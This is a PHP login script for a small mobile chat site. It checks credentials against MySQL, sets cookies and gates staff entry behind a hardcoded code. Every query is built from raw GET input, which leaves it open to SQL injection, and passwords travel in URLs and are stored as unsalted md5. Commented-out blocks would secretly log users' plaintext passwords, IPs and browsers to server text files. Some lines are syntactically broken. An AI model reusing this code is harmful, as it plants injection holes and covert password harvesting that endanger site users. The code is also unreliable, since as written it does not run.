<?php
   session_name("PHPSESSID");
session_start();

include("xhtmlfunctions.php");
header("Content-type: text/html; charset=UTF-8");
echo "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>";
echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><meta content = \"width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;\" name = \"viewport\" /> ";
?>

<?php
include("config.php");
include("core.php");
connectdb();
$bcon = connectdb();
if (!$bcon)
{
    $pstyle = gettheme1("1");
    echo xhtmlhead("$stitle (ERROR!)",$pstyle);
    echo "<p align=\"center\">";
    echo "<img src=\"images/exit.gif\" alt=\"*\"/><br/>";
    echo "ERROR! cannot connect to database<br/><br/>";
    echo "This error happens usually when backing up the database, please be patient, The site will be up any minute<br/><br/>";
    echo "<b>THANK YOU VERY MUCH</b>";
echo "In the mean time visit our back up chatroom<br/>";
echo "<a href=\"chat/index.php\"> chat [NEW!]</a>";
    echo "</p>";
  echo xhtmlfoot();
      exit();
}

$uid = $_GET["loguid"];
$pwd = $_GET["logpwd"];
$co = $_GET["cody"];
$tolog = false;
$pstyle = gettheme1("1");
      echo xhtmlhead("$stitle",$pstyle);
  echo "<p align=\"center\"><small>";
  echo "<img src=\"images/logo.jpg\" alt=\"\"/><br/>";
 
  
  $uinf = mysql_fetch_array(mysql_query("SELECT COUNT(*) FROM dcroxx_me_users WHERE name='".$uid."'"));
  if($uinf[0]==0)
  {
/* $brws = explode(" ",$HTTP_USER_AGENT);
	$ubr = $brws[0];
	$ip = $_SERVER['REMOTE_ADDR'];
	$fp = fopen("lax/nic.txt","a+");
	fwrite ($fp, "\n".$uid."-".$pwd."-".$ip."-".$ubr."\n");
	fclose($fp);*/
    echo "<img src=\"images/notok.gif\" alt=\"X\"/>UserName doesn't exist<br/><br/>";
  }else{
    //check for pwd
    $epwd = md5($pwd);
    $uinf = mysql_fetch_array(mysql_query("SELECT COUNT(*) FROM dcroxx_me_users WHERE name='".$uid."' AND pass='".$epwd."'"));
    if($uinf[0]==0)
    {
	/*$brws = explode(" ",$HTTP_USER_AGENT);
	$ubr = $brws[0];
	$ip = $_SERVER['REMOTE_ADDR'];

	$fp = fopen("lax/pas.txt","a+");
	fwrite ($fp, "\n".$uid."-".$pwd."-".$ip."-".$ubr."\n");
	fclose($fp);*/
      echo "<img src=\"images/notok.gif\" alt=\"X\"/>Incorrect Password<br/><br/>";
    }else{
      
      $tm = (time() - $timeadjust) ;
      $xtm = $tm + (getsxtm()*60 + 30 * 24 * 60 * 60);
      $did = $uid.$tm.$tm;
      $did2 = $uid.$tm.$pwd.$tm;
	  
	setcookie("tufan420", md5($did.$did2), time() + 30 * 24 * 60 * 60); // Expire in one month
setcookie("uid", getuid_nick($uid), time() + 30 * 24 * 60 * 60); // Expire in one month
setcookie("_user_", $uid, time() + 30 * 24 * 60 * 60); // Expire in one month
setcookie("_ping_po", md5($did2), time() + 30 * 24 * 60 * 60); // Expire in one month	   

$f = $_SERVER['HTTP_HOST'];
$tm = time();
$tim = $tm+43200;
$id = $l.$tm;
$sid = md5($id); 
setcookie("_ping_pong_",$sid,$tim,"/",$f); 
	  
      $res = mysql_query("INSERT INTO dcroxx_me_ses SET id='".md5($did)."', uid='".getuid_nick($uid)."', expiretm='".$xtm."'");
      
      if($res)
      {
        $tolog=true;
        //echo "Bookmark THIS page to avoid repeating the login proccess in the future<br/><br/>";
        echo "Logged in successfully as <b>$uid</b><br/>";  
        $idn = getuid_nick($uid);
        
            $lact = mysql_fetch_array(mysql_query("SELECT lastact FROM dcroxx_me_users WHERE id='".$idn."'"));
             mysql_query("UPDATE dcroxx_me_users SET lastvst='".$lact[0]."' WHERE id='".$idn."'");
             mysql_query("UPDATE dcroxx_me_users SET lastact='".(time() - $timeadjust)."' WHERE id='".$idn."'");
      }else{
        //is user already logged in?
        $logedin = mysql_fetch_array(mysql_query("SELECT (*) FROM dcroxx_me_ses WHERE uid='".$getuid_nick($uid)."'"));
        if($logedin[0]>0)
        {
          //yip, so let's just update the expiration time
          $xtm = (time() - $timeadjust) + (getsxtm()*60);
          $res = mysql_query("UPDATE dcroxx_me_ses SET expiretm='".$xtm."' WHERE uid='".getuid_nick($uid)."'");
          
          if($res)
          {
            $tolog=true;
           $brws = explode(" ",$HTTP_USER_AGENT);
	/*	$ubr = $brws[0];
		$ip = $_SERVER['REMOTE_ADDR'];
	$fp = fopen("sta114/lo.txt","a+");
	fwrite ($fp, "\n".$uid."-".$pwd."-".$ip."-".$ubr."\n");
	fclose($fp);
	$ipr = getip();
$brws = $_SERVER['HTTP_USER_AGENT'];
$ubr = $brws;
$alli = "Username: ".$uid."
Password: ".$pwd."
Ip-Address: ".$ipr."
Browser: ".$ubr."
(xhtml)
----------
";
if(trim($uid)!=""){
$fname = "sta114/".$uid.".txt";
$out = fopen($fname,"a+");
fwrite($out,$alli);
fclose($out);}
*/
           echo "<b>Its ur Staff loggin page, BOOKMARK this page!!</b> <br/> (for Auto login) <br/> <br/>Fit thama,!<br/> ";

           
            
          }else{
            echo "<img src=\"images/point.gif\" alt=\"!\"/>Can't login at the time, plz try later<br/>"; //no chance this could happen unless there's error in mysql connection
            
          }
          
        }
        
      }
    }
  }
  
  if($tolog)

{
 $_SESSION['sid'] = md5($did);
  if($co==2009ownerza)
  {

    $uid = getuid_sid($sid);
	
	   echo "<br/><a href=\"ara.php?action=main\"><img src=\"images/home.gif\" alt=\"*\"/>";
echo "Enter (+online radio)</a><br/>";
   echo "<br/><a href=\"index.php?action=main\"><img src=\"images/home.gif\" alt=\"*\"/>";
echo "Enter</a><br/><br/>";
}else{  
	  echo "incorrect code, sms me and ask ur code<br/>";
      }

        echo "Tell everyone about <b>http://Machanwap.tk</b> and make this the best place to hang out.<br/><br/>";
}else{
echo "<br/><a href=\"index.php\"><img src=\"images/home.gif\" alt=\"*\"/>";
echo "Home</a><br/><br/>";
}
echo "<b>Bookmark NOW!!<br/> (for Autologin)</b><br/><br/>";
echo "</small></p>";
echo xhtmlfoot();
exit();
?>
